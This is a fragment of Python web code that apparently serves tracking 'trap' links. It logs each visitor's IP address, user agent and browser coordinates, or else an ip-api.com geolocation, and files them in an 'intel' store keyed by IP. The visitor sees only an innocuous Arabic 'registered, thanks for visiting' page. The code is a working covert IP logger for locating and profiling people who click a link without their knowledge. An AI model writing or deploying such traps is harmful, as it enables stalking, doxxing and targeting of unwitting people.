                geo = {"lat": lat, "lon": lon}
            else:
                try:
                    geo_res = requests.get(f"http://ip-api.com/json/{visitor_ip}?fields=status,country,city,isp", timeout=3)
                    geo_data = geo_res.json()
                    if geo_data.get("status") == "success":
                        geo = {"country": geo_data.get("country"), "city": geo_data.get("city"), "isp": geo_data.get("isp")}
                except: pass
            
            visit_data = {
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "ip": visitor_ip,
                "user_agent": user_agent,
                "geo": geo
            }
            
            if "visits" not in traps[trap_id]:
                traps[trap_id]["visits"] = []
            traps[trap_id]["visits"].append(visit_data)
            save_traps(traps)
            
            intel_data = load_intel()
            if visitor_ip not in intel_data:
                intel_data[visitor_ip] = {
                    "source": "Trap",
                    "deviceType": user_agent[:50],
                    "geo": geo,
                    "trap_id": trap_id
                }
                save_intel(intel_data)
        
        return "<html><body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;'><h1>تم التسجيل</h1><p>شكراً لزيارتك.</p></body></html>"
    except Exception as e:
        return f"Error: {str(e)}"

